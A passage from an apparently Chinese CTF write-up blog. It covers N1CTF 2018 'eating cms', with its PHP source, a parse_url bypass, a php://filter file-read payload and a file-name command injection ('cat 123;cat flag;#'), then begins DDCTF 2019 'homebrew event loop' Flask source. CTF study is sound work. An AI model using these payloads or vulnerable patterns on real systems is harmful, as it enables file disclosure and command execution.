comment">//    var_dump($res);</span><span class="token comment">//    die();</span><span class="token comment">//    die($res);</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$res</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">register</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">,</span> <span class="token variable">$pass</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">global</span> <span class="token variable">$mysqli</span><span class="token punctuation">;</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">Filter</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"insert into `albert_users`(`username_which_you_do_not_know`,`password_which_you_do_not_know_too`,`isadmin_which_you_do_not_know_too_too`) VALUES ('<span class="token interpolation"><span class="token variable">$user</span></span>','<span class="token interpolation"><span class="token variable">$pass</span></span>','0')"</span><span class="token punctuation">;</span>    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">sql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token property">insert_id</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">session_destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>config.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token class-name">E_ERROR</span> <span class="token operator">|</span> <span class="token class-name">E_WARNING</span> <span class="token operator">|</span> <span class="token class-name">E_PARSE</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token constant">BASEDIR</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"/var/www/html/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token constant">FLAG_SIG</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$OPERATE</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'userinfo'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'upload'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'search'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$OPERATE_admin</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'userinfo'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'upload'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'search'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'manage'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$DBHOST</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"localhost"</span><span class="token punctuation">;</span><span class="token variable">$DBUSER</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"root"</span><span class="token punctuation">;</span><span class="token variable">$DBPASS</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Nu1LCTF2018!@#qwe"</span><span class="token punctuation">;</span><span class="token comment">//$DBPASS = "";</span><span class="token variable">$DBNAME</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"N1CTF"</span><span class="token punctuation">;</span><span class="token variable">$mysqli</span> <span class="token operator">=</span> @<span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token variable">$DBHOST</span><span class="token punctuation">,</span> <span class="token variable">$DBUSER</span><span class="token punctuation">,</span> <span class="token variable">$DBPASS</span><span class="token punctuation">,</span> <span class="token variable">$DBNAME</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">mysqli_connect_errno</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no sql connection"</span><span class="token operator">.</span><span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$mysqli</span><span class="token operator">=</span><span class="token constant">null</span><span class="token punctuation">;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>updateadmin.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant">FLAG_SIG</span> <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"you can not visit it directly "</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"templates/update.html"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里有parse_url()，可以尝试php的解析漏洞</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-N1CTF-2018-eating-cms/image-20210819224520220.png"></p><h3 id="parse-url-解析漏洞"><a href="#parse-url-解析漏洞" class="headerlink" title="parse_url()解析漏洞"></a>parse_url()解析漏洞</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$uri</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"REQUEST_URI"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$uri</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li><p><a href="http://127.0.0.1/1.php?a=123">http://127.0.0.1/1.php?a=123</a></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-N1CTF-2018-eating-cms/image-20210819225541928.png"></p></li><li><p><a href="http://127.0.0.1//1.php?a=123">http://127.0.0.1//1.php?a=123</a></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-N1CTF-2018-eating-cms/image-20210819225609362.png"></p></li><li><p><a href="http://127.0.0.1///1.php?a=123">http://127.0.0.1///1.php?a=123</a></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-N1CTF-2018-eating-cms/image-20210819225636243.png"></p></li></ul><p>这里用两个//也行，不知道是不是版本问题。</p><p>读取ffffllllaaaaggg.php</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;user.php?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;ffffllllaaaaggg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant">FLAG_SIG</span> <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"you can not visit it directly"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"you can find sth in m4aaannngggeee"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>m4aaannngggeee.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant">FLAG_SIG</span> <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"you can not visit it directly"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"templates/upload.html"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>打开/templates/upload.html</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-N1CTF-2018-eating-cms/image-20210819225951089.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-N1CTF-2018-eating-cms/image-20210819230004733.png"></p><p>templates里怎么会有php文件呢？</p><p>尝试读取upllloadddd.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$allowtype</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"gif"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"png"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"jpg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$size</span> <span class="token operator">=</span> <span class="token number">10000000</span><span class="token punctuation">;</span><span class="token variable">$path</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/"</span><span class="token punctuation">;</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$path</span> <span class="token operator">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error:can not move"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error:not an upload file！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$newfile</span> <span class="token operator">=</span> <span class="token variable">$path</span> <span class="token operator">.</span> <span class="token variable">$filename</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"file upload success&lt;br />"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$filename</span><span class="token punctuation">;</span><span class="token variable">$picdata</span> <span class="token operator">=</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/"</span> <span class="token operator">.</span> <span class="token variable">$filename</span> <span class="token operator">.</span> <span class="token string double-quoted-string">" | base64 -w 0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;img src='data:image/png;base64,"</span> <span class="token operator">.</span> <span class="token variable">$picdata</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"'>&lt;/img>"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$newfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Upload file error: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">array_pop</span><span class="token punctuation">(</span><span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token punctuation">,</span> <span class="token variable">$allowtype</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$newfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>字符串拼接而成的shell命令，明显存在代码执行漏洞。</p><pre class="line-numbers language-none"><code class="language-none">system(&quot;cat 123;cat flag;# |base 64 -w 0&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-N1CTF-2018-eating-cms/image-20210819230654935.png"></p><p>但上传点不在这，竟然在/user.php?page=m4aaannngggeee</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-N1CTF-2018-eating-cms/image-20210819231049213.png"></p><p>ls /不行，不知道为什么。看了下代码也没过滤呀。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-N1CTF-2018-eating-cms/image-20210819232125222.png"></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> PHP代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[DDCTF 2019]homebrew event loop</title>
      <link href="/p/203110635.html"/>
      <url>/p/203110635.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[flask|session解密]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-DDCTF-2019-homebrew-event-loop/image-20210819150806086.png"></p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> session<span class="token punctuation">,</span> request<span class="token punctuation">,</span> Response<span class="token keyword">import</span> urllibapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> <span class="token string">'*********************'</span>  <span class="token comment"># censored</span>url_prefix <span class="token operator">=</span> <span class="token string">'/d5afe1f66147e857'</span><span class="token keyword">def</span> <span class="token function">FLAG</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">'*********************'</span>  <span class="token comment"># censored</span><span class="token keyword">def</span> <span class="token function">trigger_event</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token punctuation">:</span>    session<span class="token punctuation">[</span><span class="token string">'log'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span>event<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>session<span class="token punctuation">[</span><span class="token string">'log'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">5</span><span class="token punctuation">:</span>        session<span class="token punctuation">[</span><span class="token string">'log'</span><span class="token punctuation">]</span> <span class="token operator">=</span> session<span class="token punctuation">[</span><span class="token string">'log'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> <span class="token builtin">type</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">type</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        request<span class="token punctuation">.</span>event_queue <span class="token operator">+=</span> event    <span class="token keyword">else</span><span class="token punctuation">:</span>        request<span class="token punctuation">.</span>event_queue<span class="token punctuation">.</span>append<span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_mid_str</span><span class="token punctuation">(</span>haystack<span class="token punctuation">,</span> prefix<span class="token punctuation">,</span> postfix<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    haystack <span class="token operator">=</span> haystack<span class="token punctuation">[</span>haystack<span class="token punctuation">.</span>find<span class="token punctuation">(</span>prefix<span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">len</span><span class="token punctuation">(</span>prefix<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> postfix <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        haystack <span class="token operator">=</span> haystack<span class="token punctuation">[</span><span class="token punctuation">:</span>haystack<span class="token punctuation">.</span>find<span class="token punctuation">(</span>postfix<span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> haystack<span class="token keyword">class</span> <span class="token class-name">RollBackException</span><span class="token punctuation">:</span>    <span class="token keyword">pass</span><span class="token keyword">def</span> <span class="token function">execute_event_loop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    valid_event_chars <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span>        <span class="token string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#'</span><span class="token punctuation">)</span>    resp <span class="token operator">=</span> <span class="token boolean">None</span>    <span class="token keyword">while</span> <span class="token builtin">len</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>event_queue<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token comment"># `event` is something like "action:ACTION;ARGS0#ARGS1#ARGS2......"</span>        event <span class="token operator">=</span> request<span class="token punctuation">.</span>event_queue<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        request<span class="token punctuation">.</span>event_queue <span class="token operator">=</span> request<span class="token punctuation">.</span>event_queue<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> event<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'action:'</span><span class="token punctuation">,</span> <span class="token string">'func:'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">for</span> c <span class="token keyword">in</span> event<span class="token punctuation">:</span>            <span class="token keyword">if</span> c <span class="token keyword">not</span> <span class="token keyword">in</span> valid_event_chars<span class="token punctuation">:</span>                <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            is_action <span class="token operator">=</span> event<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'a'</span>            action <span class="token operator">=</span> get_mid_str<span class="token punctuation">(</span>event<span class="token punctuation">,</span> <span class="token string">':'</span><span class="token punctuation">,</span> <span class="token string">';'</span><span class="token punctuation">)</span>            args <span class="token operator">=</span> get_mid_str<span class="token punctuation">(</span>event<span class="token punctuation">,</span> action<span class="token operator">+</span><span class="token string">';'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'#'</span><span class="token punctuation">)</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                event_handler <span class="token operator">=</span> <span class="token builtin">eval</span><span class="token punctuation">(</span>                    action <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token string">'_handler'</span> <span class="token keyword">if</span> is_action <span class="token keyword">else</span> <span class="token string">'_function'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                ret_val <span class="token operator">=</span> event_handler<span class="token punctuation">(</span>args<span class="token punctuation">)</span>            <span class="token keyword">except</span> RollBackException<span class="token punctuation">:</span>                <span class="token keyword">if</span> resp <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>                    resp <span class="token operator">=</span> <span class="token string">''</span>                resp <span class="token operator">+=</span> <span class="token string">'ERROR! All transactions have been cancelled. &lt;br />'</span>                resp <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:view;index">Go back to index.html&lt;/a>&lt;br />'</span>                session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>prev_session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span>                session<span class="token punctuation">[</span><span class="token string">'points'</span><span class="token punctuation">]</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>prev_session<span class="token punctuation">[</span><span class="token string">'points'</span><span class="token punctuation">]</span>                <span class="token keyword">break</span>            <span class="token keyword">except</span> Exception<span class="token punctuation">,</span> e<span class="token punctuation">:</span>                <span class="token keyword">if</span> resp <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>                    resp <span class="token operator">=</span> <span class="token string">''</span>                <span class="token comment"># resp += str(e) # only for debugging</span>                <span class="token keyword">continue</span>            <span class="token keyword">if</span> ret_val <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> resp <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>                    resp <span class="token operator">=</span> ret_val                <span class="token keyword">else</span><span class="token punctuation">:</span>                    resp <span class="token operator">+=</span> ret_val    <span class="token keyword">if</span> resp <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">or</span> resp <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">:</span>        resp <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'404 NOT FOUND'</span><span class="token punctuation">,</span> <span class="token number">404</span><span class="token punctuation">)</span>    session<span class="token punctuation">.</span>modified <span class="token operator">=</span> <span class="token boolean">True</span>    <span class="token keyword">return</span> resp<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span>url_prefix<span class="token operator">+</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">entry_point</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    querystring <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>query_string<span class="token punctuation">)</span>    request<span class="token punctuation">.</span>event_queue <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> querystring <span class="token operator">==</span> <span class="token string">''</span> <span class="token keyword">or</span> <span class="token punctuation">(</span><span class="token keyword">not</span> querystring<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'action:'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token builtin">len</span><span class="token punctuation">(</span>querystring<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">100</span><span class="token punctuation">:</span>        querystring <span class="token operator">=</span> <span class="token string">'action:index;False#False'</span>    <span class="token keyword">if</span> <span class="token string">'num_items'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>        session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>        session<span class="token punctuation">[</span><span class="token string">'points'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">3</span>        session<span class="token punctuation">[</span><span class="token string">'log'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    request<span class="token punctuation">.</span>prev_session <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span>    trigger_event<span class="token punctuation">(</span>querystring<span class="token punctuation">)</span>    <span class="token keyword">return</span> execute_event_loop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># handlers/functions below --------------------------------------</span><span class="token keyword">def</span> <span class="token function">view_handler</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>    page <span class="token operator">=</span> args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    html <span class="token operator">=</span> <span class="token string">''</span>    html <span class="token operator">+=</span> <span class="token string">'[INFO] you have &#123;&#125; diamonds, &#123;&#125; points now.&lt;br />'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>        session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> session<span class="token punctuation">[</span><span class="token string">'points'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> page <span class="token operator">==</span> <span class="token string">'index'</span><span class="token punctuation">:</span>        html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:index;True%23False">View source code&lt;/a>&lt;br />'</span>        html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:view;shop">Go to 